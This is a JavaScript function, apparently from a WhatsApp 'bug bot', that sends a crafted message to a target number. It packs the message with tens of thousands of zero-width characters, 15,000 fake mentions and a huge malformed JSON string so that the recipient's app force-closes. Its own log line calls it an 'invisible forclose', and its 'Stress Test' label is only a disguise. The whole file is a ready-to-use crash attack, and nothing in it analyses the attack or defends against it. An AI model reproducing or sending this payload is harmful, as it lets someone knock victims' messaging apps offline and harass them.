async function dayzxforclosetest(target) {
  try {
    const hugeMention = Array.from({ length: 15000 }, () => "0@s.whatsapp.net");
    const giantJson = "{".repeat(200000);

    let payload = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "\u200C".repeat(30000),
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -123.456,
                degreesLongitude: -987.654,
                name: "\u200D".repeat(30000),
                address: "\u200D".repeat(30000)
              }
            },
            body: { text: "\u200C".repeat(30000) },
            footer: { text: "\u200C".repeat(30000) },
            nativeFlowMessage: {
              messageParamsJson: giantJson
            },
            contextInfo: {
              mentionedJid: hugeMention,
              forwardingScore: 999,
              isForwarded: true,
              externalAdReply: {
                showAdAttribution: true,
                title: "🩸 Dayzx Crash",
                body: "Android 14 Stress Test",
                mediaType: 2,
                thumbnailUrl: "https://files.catbox.moe/ri8m1p.jpg",
                sourceUrl: "https://dayzx.dev"
              },
              forwardedNewsletterMessageInfo: {
                newsletterName: "Dayzx Official",
                newsletterJid: "120363321780343299@newsletter",
                serverMessageId: 1
              },
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 1,
                  expiryTimestamp: null
                }
              },
              dataSharingContext: { showMmDisclosure: true }
            }
          }
        }
      }
    }, {});

    await sock.relayMessage(target, payload.message, {
      messageId: payload.key.id,
      participant: { jid: target }
    });

    console.log(`✅ Dayzx invisible forclose sent to ${target}`);

  } catch (err) {
    console.error("🔥 Error sending Dayzx forclose:", err);
  }
}
 
>  AFIFSTORE 
